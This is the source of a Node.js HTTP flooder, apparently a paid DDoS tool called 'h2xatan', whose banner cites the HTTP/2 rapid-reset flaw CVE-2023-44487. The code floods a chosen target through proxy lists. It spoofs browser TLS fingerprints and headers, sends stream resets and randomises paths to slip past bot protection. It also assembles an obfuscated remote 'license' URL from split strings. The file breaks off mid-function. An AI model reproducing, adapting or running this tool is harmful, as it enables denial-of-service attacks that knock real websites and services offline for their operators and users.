// ну митенька точно по вене швырнул ?  // @XatanC2 daite 2000$
const port = 443; // Make sure the port is within the valid range (0-65535)
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const https = require('https');

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);

process.on('uncaughtException', function (e) {
    console.log(e)
});
process.on('unhandledRejection', function (e) {
    console.log(e)
});

const uiiu = 'https'
const phvk = '://raw.';
const dmps = 'githubuser';
const ohhv = 'content.com/';
const xioe = 'mitenkaa/';
const ssjc = 'license-';
const zasd = 'for-h2xatan/';
const ihoo = 'main/';
const lias = 'license';

const fwtgws = uiiu + phvk + dmps + ohhv + xioe + ssjc + zasd + ihoo + lias;

const statusesQ = []
let statuses = {}
let shouldCloseSession = process.argv.includes('--close');
let useRandPath = process.argv.includes('--randpath');
let ver = '2.5';
let cookiesToInclude = '';

const blockedDomain = [".r2.dev", ".dev", ".gov", ".ua"];
const license = "1";

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2024-10-25');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const customua = process.argv.indexOf('--ua');
const customuavalue = customua !== -1 && customua + 1 < process.argv.length ? process.argv[customua + 1] : undefined;
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 1;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');
const pizdecnaxyi = process.argv.includes('--status');
const parsedCookies = process.argv.includes('--parsed');
const reset = process.argv.includes('--reset');

const multipathIndex = process.argv.indexOf('--multipath');
const multipathValue = multipathIndex !== -1 && multipathIndex + 1 < process.argv.length ? process.argv[multipathIndex + 1] : undefined;

let paths = [''];

if (multipathValue) {
    paths = multipathValue.split('@').slice(0, 5);
}
const chromeCiphers = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
const chromeSigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';

const proxynewIndex = process.argv.indexOf('--ip');
const customIP = proxynewIndex !== -1 && proxynewIndex + 1 < process.argv.length ? process.argv[proxynewIndex + 1] : undefined;

const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    [flooder - nodejs] h2xatan ${ver} (CVE-2023-44487) // Updated: 14.09.2024 // With love @rapidreset :3
    Developers to method: dojdikmc - creator the first version // @rapidreset - more improves & options upgrade
    How to use & example:
      node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxyfile>
      node ${process.argv[1]} GET "https://target.com" 120 16 128 proxy.txt
    
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
      --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
      --cookie "f=f" - for custom cookie and also cookie support %RAND% ex: "bypassing=%RAND%"
      --referer https://target.com / rand - custom referer, use rand if you need generate domains ex: fwfwwfwfw.net
      --http 1/2/mix - choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --header "f:f" or "f:f#f1:f1" - if you need this use custom headers split each header with #
      --close - for closed session with http-ddos
      --randpath - for bypass signature "known botnets" ater using you path /%RAND%
      --ua "curl/4.0" - for custom agents 
      --status - for closed session with 403,400,429 codes
      --parsed - for parse set-cookie very good 
      --ip 1.1.1.1 - for browser fr good option
      --reset - for enable rapid reset exploit (for unprotected target default it is not work)
      --multipath - max 5 paths
      `);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target);
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`[#2] This target in blacklisted ${blockedDomain} if this mistake pm @XatanC2`);
    process.exit(1);
}

if (!['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'].includes(reqmethod)) {
    console.error('[#3] Request method can only GET/HEAD/POST/PUT/DELETE/CONNECT/OPTIONS/TRACE/PATCH');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('[#4] Target can only https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0.9 || time > 86400) {
    console.error('[#5] Time can 1 to 86400')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0.9 || threads > 256) {
    console.error('[#6] Threads can 1 to 256')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0.09 || ratelimit > 300) {
    console.error(`[#7] Ratelimit can 0.1 to 300 only`)
    process.exit(1);
}

if (delay <= 0.9 || delay > 1000) {
    console.error(`[#10] Delay can 1 to 1000 only`)
    process.exit(1);
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

// const httpStatusCodes = {
//     "200": { "Description": "OK", "Color": "brightGreen" },
//     "301": { "Description": "Moved Permanently", "Color": "yellow" },
//     "302": { "Description": "Found", "Color": "yellow" },
//     "304": { "Description": "Not Modified", "Color": "yellow" },
//     "400": { "Description": "Bad Request", "Color": "red" },
//     "401": { "Description": "Unauthorized", "Color": "red" },
//     "403": { "Description": "Forbidden", "Color": "red" },
//     "404": { "Description": "Found", "Color": "red" },
//     "500": { "Description": "Internal Server Error", "Color": "brightRed" },
//     "502": { "Description": "Bad Gateway", "Color": "brightRed" },
//     "503": { "Description": "Service Unavailable", "Color": "brightRed" }
// };



// function randomstring(length, type) {
//     var _ = "";
//     var characters = "";
//     if (type == "LN") {
//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
//     }
//     else if (type == "L") {
//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
//     }
//     else if (type == "N") {
//         characters = "0123456789";
//     }
//     else {
//         characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
//     }

//     var charactersLength = characters.length;

//     for (var i = 0; i < length; i++) {
//         _ += characters.charAt(Math.floor(Math.random() * charactersLength));
//     }

//     return _;
// }

// function randflood(target) {
//     if (target.includes("%RAND%")) {
//         target = target.replace(/%RAND%/g, randomstring(8, "LN"));
//     }
//     else if (target.includes("%RANDLN8%")) {
//         target = target.replace(/%RANDLN8%/g, randomstring(8, "LN"));
//     }
//     else if (target.includes("%RANDLN16%")) {
//         target = target.replace(/%RANDLN16%/g, randomstring(16, "LN"));
//     }
//     else if (target.includes("%RANDLN32%")) {
//         target = target.replace(/%RANDLN32%/g, randomstring(32, "LN"));
//     }
//     else if (target.includes("%RANDLN64%")) {
//         target = target.replace(/%RANDLN64%/g, randomstring(64, "LN"));
//     }
//     else if (target.includes("%RANDL%")) {
//         target = target.replace(/%RANDL%/g, randomstring(8, "L"));
//     }
//     else if (target.includes("%RANDL16%")) {
//         target = target.replace(/%RANDL16%/g, randomstring(16, "L"));
//     }
//     else if (target.includes("%RANDL32%")) {
//         target = target.replace(/%RANDL32%/g, randomstring(32, "L"));
//     }
//     else if (target.includes("%RANDL64%")) {
//         target = target.replace(/%RANDL64%/g, randomstring(64, "L"));
//     }
//     else if (target.includes("%RANDN%")) {
//         target = target.replace(/%RANDN%/g, randomstring(8, "N"));
//     }
//     else if (target.includes("%RANDN16%")) {
//         target = target.replace(/%RANDN16%/g, randomstring(16, "N"));
//     }
//     else if (target.includes("%RANDN32%")) {
//         target = target.replace(/%RANDN32%/g, randomstring(32, "N"));
//     }
//     else if (target.includes("%RANDN64%")) {
//         target = target.replace(/%RANDN64%/g, randomstring(64, "N"));
//     }
//     else {
//         target = target;
//     }
//     return target;
// }

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const ja3Options = {
    version: 771,
    cipherSuites: [4865, 4866, 4867, 49195, 49199, 49196, 49200, 52393, 52392, 49171, 49172, 156, 157, 47, 53],
    extensions: [17513, 13, 27, 0, 10, 65281, 43, 65037, 23, 16, 45, 11, 35, 51, 18, 5],
    ellipticCurves: [25497, 29, 23, 24],
    ellipticCurvePointFormats: [0]
};

function generateJA3Fingerprint(options) {
    const { version, cipherSuites, extensions, ellipticCurves, ellipticCurvePointFormats } = options;

    const cipherSuitesStr = cipherSuites.join('-');
    const extensionsStr = extensions.join('-');
    const ellipticCurvesStr = ellipticCurves.join('-');
    const ellipticCurvePointFormatsStr = ellipticCurvePointFormats.join('-');

    const ja3String = `${version},${cipherSuitesStr},${extensionsStr},${ellipticCurvesStr},${ellipticCurvePointFormatsStr}`;
    return ja3String;
}

const ja3Fingerprint = generateJA3Fingerprint(ja3Options);
const ja3Hash = crypto.createHash('md5').update(ja3Fingerprint).digest('hex');

function generateSpoofedFingerprint() {
    const platform = 'Win64';
    const plugins = [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Google Translate', filename: 'aapbdbdomjkkjkaonfhkkikfgjllcleb' },
        { name: 'Zoom Chrome Extension', filename: 'kgjfgplpablkjnlkjmjdecgdpfankdle' },
        { name: 'uBlock Origin', filename: 'cjpalhdlnbpafiamejdnhcphjbkeiagm' },
        { name: 'AdBlock', filename: 'gighmmpiobklfepjocnamgkkbiglidom' },
        { name: 'LastPass', filename: 'hdokiejnpimakedhajhdlcegeplioahd' },
        { name: 'Grammarly for Chrome', filename: 'kbfnbcaeplbcioakkpcpgfkobkghlhen' },
        { name: 'Microsoft Office', filename: 'dbjbempljhcmhlfpfacalomonjpalpko' },
        { name: 'Videostream for Google Chromecast', filename: 'cnciopoikihiagdjbjpnocolokfelagl' },
        { name: 'HTTPS Everywhere', filename: 'gcbommkclmclpchllfjekcdonpmejbdp' },
        { name: 'Dark Reader', filename: 'eimadpbcbfnmbkopoojfekhnkhdbieeh' },
        { name: 'Privacy Badger', filename: 'pkehgijcmpdhfbdbbnkijodmdjhbjlgp' },
        { name: 'The Great Suspender', filename: 'klbibkeccnjlkjkiokjodocebajanakg' },
    ];

    const numPlugins = getRandomInt(2, 5);
    const selectedPlugins = [];

    for (let i = 0; i < numPlugins; i++) {
        const randomIndex = getRandomInt(0, plugins.length - 1);
        selectedPlugins.push(plugins[randomIndex]);
    }

    const fingerprintString = `${platform}${JSON.stringify(selectedPlugins)}`;
    const sha256Fingerprint = crypto.createHash('sha256').update(fingerprintString).digest('hex');

    return sha256Fingerprint;
}

const generatedFP = generateSpoofedFingerprint()

//sykaconst pizdecf = getRandomInt(150,350)

function buildRequest() {
    const browserVersion = getRandomInt(126, 129);
    var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 126) {
        brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
    }
    else if (browserVersion === 127) {
        brandValue = `\"Not)A;Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
    }
    else if (browserVersion === 128) {
        brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
    }
    else if (browserVersion === 129) {
        brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
    }

    if (customuavalue) {
        userAgent = customuavalue;
    } else {
        userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const langValue = isBrave
        ? 'en-US,en;q=0.9'
        : 'en-US,en;q=0.7';

    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Host: ${url.hostname}\r\n` +
        'Connection: keep-alive\r\n' +
        'Cache-Control: max-age=0\r\n' +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Sec-Fetch-Dest: document\r\n' +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        `Accept-Language: ${langValue}\r\n` + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    //console.log(headers.toString());
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

const versions = [
    "TLSv1.3",
    "TLSv1.2"
]

const curves = [
    "X25519",
    "P-256",
    "P-384"
].join(":");

async function go() {
    let proxyHost, proxyPort, username, password;

    if (customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        [proxyHost, proxyPort, username, password] = proxy[~~(Math.random() * proxy.length)].split(':');
    } let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        await go();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', async () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: [
                    'TLS_GREASE (0xDADA)',
                    'TLS_AES_128_GCM_SHA256',
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
                    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
                    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
                    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
                    'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
                    'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
                    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
                    'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
                    'TLS_RSA_WITH_AES_128_GCM_SHA256',
                    'TLS_RSA_WITH_AES_256_GCM_SHA384',
                    'TLS_RSA_WITH_AES_128_CBC_SHA',
                    'TLS_RSA_WITH_AES_256_CBC_SHA',
					"TLS_RSA_WITH_AES_128_GCM_SHA256",
					"TLS_RSA_WITH_AES_256_GCM_SHA384",
					"TLS_DHE_RSA_WITH_AES_128_GCM_SHA256",
					"TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
					"TLS_RSA_PSK_WITH_NULL_SHA256",
					"TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256",
					"TLS_RSA_PSK_WITH_NULL_SHA256",
					"TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256",
					"TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA",
					"TLS_RSA_WITH_CAMELLIA_256_CBC_SHA",
					"TLS_DH_anon_WITH_AES_256_CBC_SHA256",
					"TLS_DH_anon_WITH_AES_128_CBC_SHA256",
					"TLS_DHE_RSA_WITH_AES_256_CBC_SHA256",
					"TLS_DHE_DSS_WITH_AES_256_CBC_SHA256",
					"TLS_DH_RSA_WITH_AES_256_CBC_SHA256",
					"TLS_DH_DSS_WITH_AES_256_CBC_SHA256",
					"TLS_DHE_RSA_WITH_AES_128_CBC_SHA256",
					"TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA",
					"TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA",
					"TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA",
					"TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA",
					"TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA",
					"TLS_RSA_WITH_CAMELLIA_128_CBC_SHA",
					"TLS_DHE_DSS_WITH_AES_128_CBC_SHA256",
					"TLS_DH_RSA_WITH_AES_128_CBC_SHA256",
					"TLS_DH_DSS_WITH_AES_128_CBC_SHA256",
					"TLS_RSA_WITH_AES_256_CBC_SHA256",
					"TLS_RSA_WITH_AES_128_CBC_SHA256",
					"TLS_RSA_WITH_NULL_SHA256",
					"TLS_DHE_RSA_WITH_AES_128_CBC_SHA",
					"TLS_DHE_DSS_WITH_AES_128_CBC_SHA",
					"TLS_DH_RSA_WITH_AES_128_CBC_SHA",
					"TLS_KRB5_EXPORT_WITH_RC4_40_MD5",
					"TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA",
					"TLS_KRB5_WITH_IDEA_CBC_SHA",
					"TLS_KRB5_WITH_3DES_EDE_CBC_SHA",
					"TLS_KRB5_WITH_DES_CBC_SHA",
					"TLS_DH_anon_WITH_3DES_EDE_CBC_SHA",
					"TLS_ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
					"TLS_ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
					"TLS_AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
					"TLS_EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
					"TLS_HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
					"TLS_ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
                ].join(':'),
                sigalgs: [
                    'ecdsa_secp256r1_sha256',
					"ecdsa_secp521r1_sha512",
					"rsa_pss_pss_sha256",
					"rsa_pss_pss_sha384",
					"rsa_pss_pss_sha512",
                    'rsa_pss_rsae_sha256',
                    'rsa_pkcs1_sha256',
                    'ecdsa_secp384r1_sha384',
                    'rsa_pss_rsae_sha384',
                    'rsa_pkcs1_sha384',
                    'rsa_pss_rsae_sha512',
                    'rsa_pkcs1_sha512'
                ].join(':'),
                ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
                minVersion: versions[versions.length - 1], // Устанавливаем минимальную версию TLS 1.3
                maxVersion: versions[0], // Ограничиваем использование только TLS 1.3
                rejectUnauthorized: false, // Включаем проверку сертификатов
                requestOCSP: Math.random() < 0.50 ? true : false, // Включаем проверку отзыва сертификатов через OCSP
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite();
                                }, 250 / ratelimit);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }

                    doWrite();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, 65536],
                        [2, 0],
                        [4, 6291456],
                        [6, 262144]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on("close", () => {
                    if (!statuses["CLOSE"]) statuses["CLOSE"] = 0;
                    statuses["CLOSE"]++;
                });

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
//    const responseString = data.toString(); /// debug34
//                 console.log('Received Data:\n', responseString);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }

                            if (frame.type == 1) {
                                const decodedHeaders = hpack.decode(frame.payload);
                                const setCookieHeaders = decodedHeaders.filter(header => header[0].toLowerCase() === 'set-cookie');
                                const cacheControlHeader = decodedHeaders.find(header => header[0].toLowerCase() === 'cache-control');
                                const statusObject = decodedHeaders.find(header => header[0] === ':status');
                                const status = statusObject ? statusObject[1] : null;

                                if (parsedCookies) {
                                    if (setCookieHeaders && setCookieHeaders.length > 0) {
                                        let formattedCookies = setCookieHeaders
                                            .map(cookie => cookie[1].split(';')[0].trim())
                                            .join(';');
                                        cookiesToInclude = formattedCookies;
                                    }
                                }

                                if (shouldCloseSession) {
                                    if (cacheControlHeader && cacheControlHeader[1].toLowerCase().includes('max-age=15')) {
                                        tlsSocket.end(() => tlsSocket.destroy());
                                        return;
                                    }

                                    if (pizdecnaxyi) {
                                        if (status) {
                                            if (['403', '400', '429', '408', '401'].includes(status)) {
                                                tlsSocket.end(() => tlsSocket.destroy());
                                                return;
                                            }
                                        }
                                    }
                                }

                                if (frame.type == 6) {
                                    if (!(frame.flags & 0x1)) {
                                        tlsSocket.write(encodeFrame(0, 6, frame.payload, 0x1));
                                    }
                                }

                                if (!statuses[status]) {
                                    statuses[status] = 0;
                                }

                                statuses[status]++;
                            }

                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                                        statuses["GOAWAY"]++;
                                        if (reset) {
                                            tlsSocket.write(encodeRstStream(0, 3, 0));
                                            tlsSocket.end();
                                        }
                                    }
                                }
                                if (reset) {
                                    tlsSocket.write(encodeRstStream(0, 3, 0));
                                    tlsSocket.end(() => tlsSocket.destroy());
                                }
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.on('close', () => {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                });

                tlsSocket.write(Buffer.concat(frames));
                // let ratelimit;
                let currentPathIndex = 0;

                const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
                async function doWrite() {
                    if (tlsSocket.destroyed) return;

                    const interval = 250 / ratelimit;
                    let lastRequestTime = process.hrtime.bigint();

                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }

                    async function sendRequest() {
						const browserVersion = getRandomInt(126, 129);
                        let userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];
                        const allah = ["application/x-www-form-urlencoded; charset=UTF-8", "application/x-www-form-urlencoded", "text/html; charset=utf-8", "application/json", "text/plain"];
                        const allah1 = allah[Math.floor(Math.random() * allah.length)];

                        let brandValue;
                        if (browserVersion === 126) {
                            brandValue = `"Not/A)Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
                        } else if (browserVersion === 127) {
                            brandValue = `"Not)A;Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
                        } else if (browserVersion === 128) {
